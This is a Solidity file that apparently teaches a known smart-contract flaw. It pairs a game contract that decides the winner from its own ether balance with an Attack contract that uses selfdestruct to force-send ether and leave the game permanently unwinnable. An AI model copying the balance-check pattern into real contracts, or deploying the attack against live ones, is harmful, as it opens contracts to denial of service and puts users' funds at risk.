pragma solidity ^0.8.10;

contract EtherGame{
    uint public targetAmount=5 ether;
    address public winner;

    function play() public payable{
        require(msg.value==1 ether,"Ypu can only send 1 ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount,"Game is Over");


        if (balance==targetAmount){
            winner=msg.sender;
        }
    }
        function claimReward() public {
            require (msg.sender==winner,"Not the Winner");
            (bool sent,)=msg.sender.call{value:address(this).balance}("");
            require (sent,"Failed to send Ether");
        }
    

}

contract Attack{
    EtherGame etherGame;
    
    constructor (EtherGame _etherGame){ 
        etherGame=EtherGame(_etherGame);

    }

    function attack() public payable{
        address payable addr=payable(address (etherGame));
        selfdestruct(addr);
    }
}
